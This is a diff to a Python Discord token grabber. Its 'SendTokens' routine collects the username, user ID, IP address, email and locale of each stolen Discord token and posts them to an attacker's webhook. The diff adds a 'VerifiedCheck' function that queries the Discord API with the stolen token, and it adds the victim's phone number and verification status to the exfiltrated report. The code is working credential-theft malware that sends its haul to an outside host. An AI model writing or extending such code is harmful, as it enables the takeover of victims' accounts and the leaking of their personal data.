@@ -106,6 +106,16 @@ def GetPhoneNumber(token):
     phone_number = info['phone']
     return phone_number
 
+def VerifiedCheck(token):
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    }
+    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
+    verified = info['verified']
+    verified = bool(verified)
+    return verified
+
 def GetLocale(token):
     languages = {
         'da'    : 'Danish, Denmark',
@@ -167,6 +177,7 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         user_id = GetUserId(token)
         email = GetEmail(token)
         phone_number = GetPhoneNumber(token)
+        verified_check = VerifiedCheck(token)
         locale = GetLocale(token)[0]
         language = GetLocale(token)[1]
         
@@ -174,11 +185,13 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'
 
         embed[0]['description'] += f'''Username   = {username}
-User Id  = {user_id}
+User Id    = {user_id}
 Ip Address = {ip_address}
-Email    = {email}
-Locale   = {locale}
-Language = {language}'''
+Email      = {email}
+Phone      = {phone_number}
+Verified   = {verified_check}
+Locale     = {locale}
+Language   = {language}'''
 
 
         embed[0]['description'] += '```'
